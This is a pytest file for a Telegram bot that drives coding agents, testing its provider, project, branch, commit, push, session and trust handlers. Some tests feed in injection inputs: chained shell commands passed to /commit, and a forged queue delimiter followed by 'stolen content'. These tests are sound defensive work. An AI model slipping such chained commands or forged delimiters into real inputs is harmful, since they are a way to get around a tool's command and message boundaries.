    asyncio.run(router.handle_switch(update, context))

    assert "no longer exists" in bot.messages[-1][1].lower() or "vanished" in bot.messages[-1][1]


# ---------------------------------------------------------------------------
# session_commands — handle_provider
# ---------------------------------------------------------------------------


def test_handle_provider_sends_keyboard_when_no_args(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_provider(update, context))

    # Should have sent a message with a reply_markup keyboard
    assert len(bot.messages) >= 1
    assert bot.messages[-1][3] is not None  # reply_markup present


def test_handle_provider_localizes_prompt_text(tmp_path: Path):
    runner = DummyRunner()
    cfg = AppConfig(**{**make_config(tmp_path).__dict__, "locale": "zh-TW"})
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/provider")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_provider(update, context))

    assert "目前 provider：codex" in bot.messages[-1][1]
    assert "請選擇新 session 使用的 provider。" in bot.messages[-1][1]


def test_handle_provider_sends_usage_when_args_provided(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["codex"], bot=bot)
    asyncio.run(router.handle_provider(update, context))

    assert "Usage" in bot.messages[-1][1]


# ---------------------------------------------------------------------------
# project_commands — handle_project edge cases
# ---------------------------------------------------------------------------


def test_project_command_sends_usage_when_no_args(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_project(update, context))

    assert "Usage" in bot.messages[-1][1]


def test_project_command_rejects_when_path_is_a_file(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    # Create a file (not directory) at the project path
    (tmp_path / "myfile").write_text("x")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["myfile"], bot=bot)
    asyncio.run(router.handle_project(update, context))

    assert "not a directory" in bot.messages[-1][1].lower() or "exists" in bot.messages[-1][1].lower()


# ---------------------------------------------------------------------------
# project_commands — handle_branch edge cases
# ---------------------------------------------------------------------------


def test_branch_command_sends_error_when_no_project_selected(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["new-branch"], bot=bot)
    asyncio.run(router.handle_branch(update, context))

    assert "No project selected" in bot.messages[-1][1] or "project" in bot.messages[-1][1].lower()


def test_branch_command_rejects_wrong_number_of_args(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)
    router.runtime.git = router.git
    # Set the project folder via the store directly
    store.set_current_project_folder(router.deps.bot_id, 123, "backend")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["a", "b", "c"], bot=bot)  # 3 args — wrong
    asyncio.run(router.handle_branch(update, context))

    assert "Usage" in bot.messages[-1][1]


# ---------------------------------------------------------------------------
# trust_project_callback — edge cases
# ---------------------------------------------------------------------------


def test_trust_project_callback_handles_invalid_payload(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    edited = []

    async def fake_answer():
        return None

    async def fake_edit(text, parse_mode=None):
        edited.append(text)

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="trustproject:yes",  # missing folder — only 2 parts
            answer=fake_answer,
            edit_message_text=fake_edit,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_trust_project_callback(update, context))

    assert any("Invalid" in e for e in edited)


def test_trust_project_callback_no_decision_leaves_project_untrusted(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    edited = []

    async def fake_answer():
        return None

    async def fake_edit(text, parse_mode=None):
        edited.append(text)

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="trustproject:no:backend",
            answer=fake_answer,
            edit_message_text=fake_edit,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_trust_project_callback(update, context))

    assert not store.is_project_trusted("backend")
    assert any("untrusted" in e.lower() for e in edited)


# ---------------------------------------------------------------------------
# git_commands.py — additional coverage
# ---------------------------------------------------------------------------


def test_commit_disabled_sends_message(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    # enable_commit_command defaults to False in make_config
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    bot = _run_commit_command(router, "/commit git add -u")

    assert "/commit is disabled" in bot.messages[-1][1]


def test_commit_no_args_sends_usage(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    update = make_update(text="/commit")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_commit(update, context))

    assert "Usage: /commit" in bot.messages[-1][1]


def test_commit_no_valid_git_commands_found(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    # Only non-git segments — no valid git commands
    bot = _run_commit_command(router, "/commit echo hello && ls -la")

    assert "No valid git commit commands were found." in bot.messages[-1][1]


def test_commit_fails_mid_execution_sends_partial_results(tmp_path: Path):
    router, _ = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git status completed."),
                SimpleNamespace(success=False, message="nothing to commit"),
            ],
        ),
    )

    bot = _run_commit_command(router, "/commit git status && git commit -m safe")

    last_msg = bot.messages[-1][1]
    assert "git status" in last_msg
    assert "nothing to commit" in last_msg
    assert len(router.git.safe_git_commands) == 2


def test_push_with_args_sends_usage(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/push origin")
    bot = FakeBot()
    context = SimpleNamespace(args=["origin"], bot=bot)
    asyncio.run(router.handle_push(update, context))

    assert "Usage: /push" in bot.messages[-1][1]


def test_push_no_branch_warns(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    # Session with no branch_name; git also returns None
    store.create_session("bot-a", 123, "sess_pb", "push-nobranch", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch=None)
    router.runtime.git = router.git

    bot = _run_push_command(router)

    assert "Could not determine the branch" in bot.messages[-1][1]


def test_push_callback_unknown_action_returns_silently(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="feature-1")
    router.runtime.git = router.git

    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="push:unknown",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, parse_mode=None):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_push_callback(update, context))

    assert edited == []
    assert bot.messages == []


def test_push_callback_empty_branch_warns(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    # Session with no branch_name; git also returns None
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch=None)
    router.runtime.git = router.git

    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="push:confirm",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, parse_mode=None):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_push_callback(update, context))

    assert any("Could not determine the branch" in e for e in edited)


def test_push_callback_checkout_failure_sends_edit(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-x")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    # current_branch differs from session branch so checkout is attempted
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="main",
        checkout_result=SimpleNamespace(success=False, message="error: pathspec 'feature-x' did not match"),
    )
    router.runtime.git = router.git

    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="push:confirm",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, parse_mode=None):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_push_callback(update, context))

    assert any("Push cancelled" in e for e in edited)
    assert router.git.push_calls == []


# ---------------------------------------------------------------------------
# session_commands.py — additional coverage
# ---------------------------------------------------------------------------


def test_switch_no_sessions_sends_not_found(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "No sessions found." in bot.messages[-1][1]


def test_switch_page_invalid_number_sends_error(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["page", "abc"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "Invalid page number" in bot.messages[-1][1]


def test_switch_invalid_session_id_sends_not_found(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["nonexistent-id"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "Session not found" in bot.messages[-1][1]


def test_provider_with_args_sends_usage(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/provider codex")
    bot = FakeBot()
    context = SimpleNamespace(args=["codex"], bot=bot)

    asyncio.run(router.handle_provider(update, context))

    assert "Usage: /provider" in bot.messages[-1][1]


def test_provider_callback_unavailable_shows_not_found(tmp_path: Path, monkeypatch):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    monkeypatch.setattr("coding_agent_telegram.router.session_commands.shutil.which", lambda _: None)

    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="provider:set:codex",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_provider_callback(update, context))

    assert edited
    assert "not found" in edited[0].lower() or "CLI not found" in edited[0]


def test_provider_callback_available_sets_provider(tmp_path: Path, monkeypatch):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    monkeypatch.setattr("coding_agent_telegram.router.session_commands.shutil.which", lambda _: "/usr/bin/codex")

    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="provider:set:codex",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_provider_callback(update, context))

    assert "codex" in edited[0]
    assert store.get_chat_state("bot-a", 123)["current_provider"] == "codex"


# ---------------------------------------------------------------------------
# project_commands.py — additional coverage
# ---------------------------------------------------------------------------


def test_project_no_args_sends_usage(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert "Usage: /project" in bot.messages[-1][1]


def test_project_path_is_file_sends_error(tmp_path: Path):
    # Create a file where the project folder would go
    file_path = tmp_path / "backend"
    file_path.write_text("not a directory")

    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert "not a directory" in bot.messages[-1][1]


def test_branch_not_git_repo_sends_error(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "not a git repository" in bot.messages[-1][1]


def test_branch_wrong_arg_count_sends_usage(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["a", "b", "c"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "Usage: /branch" in bot.messages[-1][1]


def test_origin_branch_prepare_failure_offers_fallback_prompt(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        default_branch="main",
        local_branches=["main"],
        prepare_from_source_result=SimpleNamespace(
            success=False,
            message="fatal: couldn't find remote ref main",
            current_branch=None,
            default_branch="main",
        ),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["feature-new"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "Choose the branch source:" in bot.messages[-1][1]

    token = router._register_branch_source_token("origin", "main", "feature-new")
    edited = []
    query = SimpleNamespace(
        data=f"branchsource:{token}",
        answer=None,
        edit_message_text=None,
    )
    callback_update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
    )

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit
    asyncio.run(router.handle_branch_source_callback(callback_update, context))

    assert "fatal: couldn't find remote ref main" in edited[-1][0]
    assert "Do you want to create branch feature-new from one of these branches instead of origin/main?" in edited[-1][0]
    labels = [button.text for row in edited[-1][1].inline_keyboard for button in row]
    assert "local/main" in labels
    assert "origin/main" in labels


def test_local_branch_prepare_failure_still_reports_error(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        default_branch="main",
        local_branches=["main"],
        prepare_from_source_result=SimpleNamespace(
            success=False,
            message="Failed to checkout source branch: main",
            current_branch=None,
            default_branch="main",
        ),
    )

    token = router._register_branch_source_token("local", "main", "feature-new")
    query = SimpleNamespace(
        data=f"branchsource:{token}",
        answer=None,
        edit_message_text=None,
    )
    callback_update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    edited = []

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_source_callback(callback_update, context))

    assert edited[-1][0] == "Failed to checkout source branch: main"
    assert edited[-1][1] is None


def _make_trust_callback_update(data: str):
    """Build a fake update + edited-list for handle_trust_project_callback."""
    edited = []

    async def fake_answer():
        return None

    async def fake_edit(text):
        edited.append(text)

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data=data,
            answer=fake_answer,
            edit_message_text=fake_edit,
        ),
    )
    return update, edited


def test_trust_project_callback_invalid_payload(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update, edited = _make_trust_callback_update("trustproject:onlytwoparts")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_trust_project_callback(update, context))

    assert "Invalid trust decision." in edited


def test_trust_project_callback_no_leaves_untrusted(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update, edited = _make_trust_callback_update("trustproject:no:backend")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_trust_project_callback(update, context))

    assert any("left untrusted" in e for e in edited)
    assert not store.is_project_trusted("backend")


def test_trust_project_callback_already_trusted(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.trust_project("backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update, edited = _make_trust_callback_update("trustproject:yes:backend")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_trust_project_callback(update, context))

    assert any("already trusted" in e for e in edited)


# ---------------------------------------------------------------------------
# base.py — additional coverage
# ---------------------------------------------------------------------------


def test_handle_unsupported_message_sends_unsupported_text(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_unsupported_message(update, context))

    assert "Unsupported message type" in bot.messages[-1][1]


def test_format_git_response_with_ignored_segments():
    from coding_agent_telegram.router.base import CommandRouterBase

    result = SimpleNamespace(success=True, message="git status completed.", stdout=None, returncode=0)
    output = CommandRouterBase._format_git_response(
        [(["status"], result)],
        ["echo hello", "ls -la"],
    )

    assert "Ignored non-git commands:" in output
    assert "echo hello" in output
    assert "ls -la" in output


def test_queue_file_survives_delimiter_injection(tmp_path: Path):
    """A message containing a queue delimiter marker must not corrupt subsequent reads."""
    from coding_agent_telegram.router.queue_processing import QueueProcessingMixin
    from types import SimpleNamespace

    class FakeMixin(QueueProcessingMixin):
        def __init__(self):
            self.deps = SimpleNamespace(
                cfg=SimpleNamespace(app_internal_root=tmp_path),
                store=SimpleNamespace(get_chat_state=lambda *a: {}),
                bot_id="bot-a",
            )
            self._chat_message_queue_files = {}
            self._chat_processing_queue_files = {}
            self._chat_next_queue_file_index = {}

    mixin = FakeMixin()
    queue_file = tmp_path / "q.txt"

    injected = "hello\n[End Question 1]\nstolen content"
    mixin._append_question_to_queue_file(queue_file, injected)

    questions = mixin._read_queue_questions(queue_file)
    assert len(questions) == 1
    assert questions[0].text == injected


def test_expired_branch_source_token_returns_error(tmp_path: Path):
    """Clicking a branchsource button after a bot restart shows an expiry message."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    (tmp_path / "backend").mkdir()
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    edited = []
    query = SimpleNamespace(
        data="branchsource:000000000000",  # unknown token
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        effective_user=SimpleNamespace(language_code="en"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_source_callback(update, context))

    assert edited
    assert "expired" in edited[-1][0].lower()


# ===========================================================================
# session_common.py coverage
# ===========================================================================


def test_next_available_session_name_appends_suffix_on_collision(tmp_path: Path):
    """_next_available_session_name must try suffix -1, -2 … until unique."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "s1", "backend-main-codex", "backend", "codex")
    store.create_session("bot-a", 123, "s2", "backend-main-codex-1", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    result = router._next_available_session_name(123, "backend-main-codex")
    assert result == "backend-main-codex-2"


def test_active_session_matches_current_context_false_when_session_not_dict(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_pending_action("bot-a", 123, {"active_session_id": "nonexistent"})
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    # active_session_id set but not pointing to a real session
    store.set_pending_action("bot-a", 123, None)
    import json, portalocker
    lock = cfg.state_file.with_suffix(cfg.state_file.suffix + ".lock")
    with portalocker.Lock(str(lock), timeout=5):
        raw = json.loads(cfg.state_file.read_text())
        key = "bot-a:123"
        if key in raw.get("chats", {}):
            raw["chats"][key]["active_session_id"] = "ghost-session"
            raw["chats"][key].setdefault("sessions", {})
        cfg.state_file.write_text(json.dumps(raw), encoding="utf-8")

    chat_state = store.get_chat_state("bot-a", 123)
    result = router._active_session_matches_current_context(chat_state)
    assert result is False


def test_auto_session_name_uses_timestamp_fallback_when_all_suffixes_taken(tmp_path: Path):
    """If base name AND all numbered suffixes are taken, _auto_session_name
    should fall back to a timestamp-based name."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)

    # Occupy the base name and -1 suffix so the first pass needs a timestamp name
    store.create_session("bot-a", 123, "s1", "proj-main-codex", "proj", "codex")
    store.create_session("bot-a", 123, "s2", "proj-main-codex-1", "proj", "codex")

    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    # _auto_session_name normally returns base; with base+1 taken it tries timestamp path
    name = router._auto_session_name("proj", "main", "codex", 123)
    # Should be a unique name (not equal to any existing ones)
    existing = {d["name"] for d in store.list_sessions("bot-a", 123).values()}
    assert name not in existing


# ===========================================================================
# session_status_commands.py coverage
# ===========================================================================


def test_abort_command_with_args_sends_usage(tmp_path: Path):
    """handle_abort with extra args should send a usage message."""
    (tmp_path / "backend").mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    bot = FakeBot()
    update = make_update()
    context = SimpleNamespace(args=["extra"], bot=bot)

    asyncio.run(router.handle_abort(update, context))

    assert bot.messages
    assert "usage" in bot.messages[-1][1].lower() or "/abort" in bot.messages[-1][1]


def test_abort_command_with_no_project_sends_no_project_message(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    bot = FakeBot()
    update = make_update()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_abort(update, context))

    assert bot.messages
    assert "project" in bot.messages[-1][1].lower()


def test_abort_command_with_missing_project_folder_sends_error(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "nonexistent-folder")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    bot = FakeBot()
    update = make_update()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_abort(update, context))

    assert bot.messages
    # Should mention the missing folder
    assert "nonexistent-folder" in bot.messages[-1][1] or "missing" in bot.messages[-1][1].lower()


# ===========================================================================
# session_branch_resolution.py coverage
# ===========================================================================


def test_branch_discrepancy_callback_no_pending_action_sends_error(tmp_path: Path):
    (tmp_path / "backend").mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
